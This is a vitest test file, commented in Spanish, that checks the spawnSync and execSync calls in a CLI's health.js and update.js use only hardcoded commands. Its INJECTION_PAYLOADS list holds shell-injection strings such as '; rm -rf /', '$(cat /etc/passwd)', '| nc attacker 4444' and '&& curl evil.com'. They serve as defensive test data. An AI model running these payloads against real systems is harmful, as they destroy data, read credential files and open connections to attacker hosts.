/**
 * @file fuzzing-injection.test.js
 * @description Fuzzing de command injection contra health.js y update.js.
 * Verifica que los comandos pasados a spawnSync/execSync son hardcodeados y
 * nunca interpolan input de usuario. NO modifica source: solo lee y testa los
 * archivos existentes.
 */

import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..', '..');

const HEALTH_SOURCE = fs.readFileSync(
  path.join(ROOT, 'src/commands/health.js'),
  'utf8'
);
const UPDATE_SOURCE = fs.readFileSync(
  path.join(ROOT, 'src/commands/update.js'),
  'utf8'
);

/**
 * Extrae el contenido de las llamadas spawnSync(...) y execSync(...) para
 * auditar que sus comandos y argumentos son literales hardcodeados.
 */
function spawnExecCalls(source) {
  const spawnCalls = source.match(/spawnSync\([^)]+\)/g) || [];
  const execCalls = source.match(/execSync\([^)]+\)/g) || [];
  return [...spawnCalls, ...execCalls];
}

const HEALTH_CALLS = spawnExecCalls(HEALTH_SOURCE);
const UPDATE_CALLS = spawnExecCalls(UPDATE_SOURCE);
const ALL_CALLS = [...HEALTH_CALLS, ...UPDATE_CALLS];

/**
 * Caracteres y secuencias típicos de inyección de comandos de shell.
 */
const INJECTION_PAYLOADS = [
  ';',
  '|',
  '&&',
  '||',
  '$()',
  '`',
  '\n',
  '\r',
  '${IFS}',
  '$(cat /etc/passwd)',
  '`cat /etc/passwd`',
  '; rm -rf /',
  '| nc attacker 4444',
  '&& curl evil.com',
  '; ls -la',
  '| whoami',
  '`id`',
  '$(id)',
  '; reboot',
  '|| shutdown',
];

describe('Command injection fuzzing', () => {
  it('health.js uses only hardcoded npm command and args', () => {
    // health.js debe invocar spawnSync('npm', ['--version'], ...) con args fijos.
    expect(HEALTH_SOURCE).toContain("spawnSync('npm', ['--version']");
    expect(HEALTH_SOURCE).toContain('shell: true');

    // Cada llamada a spawnSync en health.js debe ser un literal sin interpolacion.
    for (const call of HEALTH_CALLS) {
      expect(call).not.toMatch(/\$\{/);
      expect(call).not.toMatch(/`/);
    }
  });

  it('update.js uses only hardcoded npm view string', () => {
    // update.js debe usar execSync('npm view g360-cli version', ...) — string hardcodeado.
    expect(UPDATE_SOURCE).toContain("execSync('npm view g360-cli version'");
    expect(UPDATE_SOURCE).toContain("execSync('npm install -g g360-cli'");

    // Ninguna execSync interpola variables de usuario.
    for (const call of UPDATE_CALLS) {
      expect(call).not.toMatch(/\$\{/);
      expect(call).not.toMatch(/`/);
    }
  });

  it('no injection payload appears inside spawnSync/execSync call strings', () => {
    // Solo auditamos el contenido de las llamadas, no todo el archivo (el archivo
    // puede contener ';' o '|' en comentarios o strings ajenos al comando).
    for (const payload of INJECTION_PAYLOADS) {
      for (const call of ALL_CALLS) {
        expect(call).not.toContain(payload);
      }
    }
  });

  it('health.js npmAvailable uses fixed args only', () => {
    const npmAvailableMatch = HEALTH_SOURCE.match(
      /function npmAvailable[\s\S]*?\n}/
    );
    expect(npmAvailableMatch).toHaveLength(1);
    expect(npmAvailableMatch[0]).toContain("spawnSync('npm', ['--version']");
  });

  it('property: no known injection payload appears in spawnSync/execSync calls', () => {
    fc.assert(
      fc.property(fc.constantFrom(...INJECTION_PAYLOADS), (payload) => {
        for (const call of ALL_CALLS) {
          expect(call).not.toContain(payload);
        }
        return true;
      }),
      { numRuns: INJECTION_PAYLOADS.length }
    );
  });
});
